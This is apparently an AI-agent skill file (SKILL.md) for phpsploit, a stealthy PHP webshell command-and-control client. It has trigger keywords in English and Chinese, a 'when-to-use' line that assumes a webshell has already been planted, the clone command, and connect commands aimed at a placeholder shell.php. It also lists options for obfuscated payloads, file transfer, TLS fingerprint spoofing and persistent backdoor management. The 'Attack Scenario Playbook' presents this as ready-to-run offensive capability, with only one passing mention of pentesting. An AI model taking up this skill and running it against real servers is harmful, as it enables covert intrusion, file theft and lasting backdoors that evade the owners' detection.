---
name: phpsploit-c2-console
description: "Stealthy PHP C2 client. Signals: webshell, rce, connect PHP shell, obfuscated payload, file transfer."
zh-signals: "phpsploit: 隐蔽 PHP C2 客户端。信号:webshell,rce,连接 PHP shell,混淆载荷,文件传输。"
when-to-use: >-
  Use when you have planted a PHP webshell and need a stealthy full-featured
  C2 console with traffic obfuscation, tunneling and file transfer.
---

# phpsploit

- Attack Category: C13 Remote Command Execution and WebShell
- Upstream Repository: https://github.com/nil0x42/phpsploit
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/nil0x42/phpsploit && cd phpsploit
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./phpsploit --target https://t.com/shell.php` | Connect to the PHP shell |
| `set PAYLOAD obfuscate` | Obfuscated payload |
| `upload/download` | File transfer |
| `exploit` | Run a module |

## Attack Scenario Playbook

### Stealthy PHP C2 client

```bash
./phpsploit --target https://t.com/files/shell.php
# Full-featured console: proxy, encoding, TLS fingerprint spoofing, persistent backdoor management
```

## Notes

Full-featured PHP shell client with traffic obfuscation, tunneling and a plugin system; a backdoor manager for pentest scenarios.
